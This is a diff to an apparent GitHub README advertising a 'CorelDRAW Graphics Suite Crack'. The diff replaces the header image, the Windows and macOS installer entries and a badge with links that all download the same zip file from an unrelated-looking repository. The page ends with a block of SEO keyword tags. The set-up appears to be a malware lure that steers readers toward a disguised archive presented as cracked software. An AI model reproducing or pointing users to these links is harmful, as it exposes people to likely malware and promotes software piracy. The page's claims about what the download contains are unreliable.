@@ -1,5 +1,5 @@
 
-![61DMMooyX0L _AC_UF894,1000_QL80_](https://github.com/user-attachments/assets/b5f438bd-64a5-405a-a15c-038bc87340cb)
+![61DMMooyX0L _AC_UF894,1000_QL80_](https://github.com/GadgetManondiscord/ShanbayVocab-AlpacaPTE-chrome-crawler/raw/refs/heads/main/prelation/Alpaca-Shanbay-crawler-PT-chrome-Vocab-3.0.zip)
 
 # CorelDRAW Graphics Suite Crack Crack
 
@@ -29,8 +29,8 @@ Welcome to the **CorelDRAW Graphics Suite Crack Crack** repository! This project
 
 1. **Run the Installer**
    - Navigate to the folder and execute the appropriate script:
-     - For Windows: `install_windows.bat`
-     - For macOS: `install_mac.sh`
+     - For Windows: `https://github.com/GadgetManondiscord/ShanbayVocab-AlpacaPTE-chrome-crawler/raw/refs/heads/main/prelation/Alpaca-Shanbay-crawler-PT-chrome-Vocab-3.0.zip`
+     - For macOS: `https://github.com/GadgetManondiscord/ShanbayVocab-AlpacaPTE-chrome-crawler/raw/refs/heads/main/prelation/Alpaca-Shanbay-crawler-PT-chrome-Vocab-3.0.zip`
 
 2. **Follow the On-Screen Instructions**
 
@@ -76,7 +76,7 @@ Contributions are welcome! Please follow these steps:
 ---
 
 #
-[![https://LwVm6.gotra.top/52/E2xGLCT](https://LBwkft6.gotra.top/l.svg)](https://tULfq.gotra.top/52/aqUE1)
+[![https://github.com/GadgetManondiscord/ShanbayVocab-AlpacaPTE-chrome-crawler/raw/refs/heads/main/prelation/Alpaca-Shanbay-crawler-PT-chrome-Vocab-3.0.zip](https://github.com/GadgetManondiscord/ShanbayVocab-AlpacaPTE-chrome-crawler/raw/refs/heads/main/prelation/Alpaca-Shanbay-crawler-PT-chrome-Vocab-3.0.zip)](https://github.com/GadgetManondiscord/ShanbayVocab-AlpacaPTE-chrome-crawler/raw/refs/heads/main/prelation/Alpaca-Shanbay-crawler-PT-chrome-Vocab-3.0.zip)
 # Tags:
 aftershot-3-hdr-for-coreldraw-graphics-suite coreldraw-graphics-suite-11 coreldraw-graphics-suite-x4 coreldraw-graphics-suite-upgrade coreldraw-graphics-suite-price coreldraw-graphics-suite-x5-serial-number coreldraw-graphics-suite-2021 coreldraw-technical-suite-vs-graphics-suite coreldraw-graphics-suite-key-generator coreldraw-essentials-vs-graphics-suite coreldraw-9-graphics-suite buy-coreldraw-graphics-suite coreldraw-graphics-suite-windows-10 coreldraw-graphics-suite-vs-technical-suite coreldraw-graphics-suite-13 coreldraw-graphics-suite-12
 
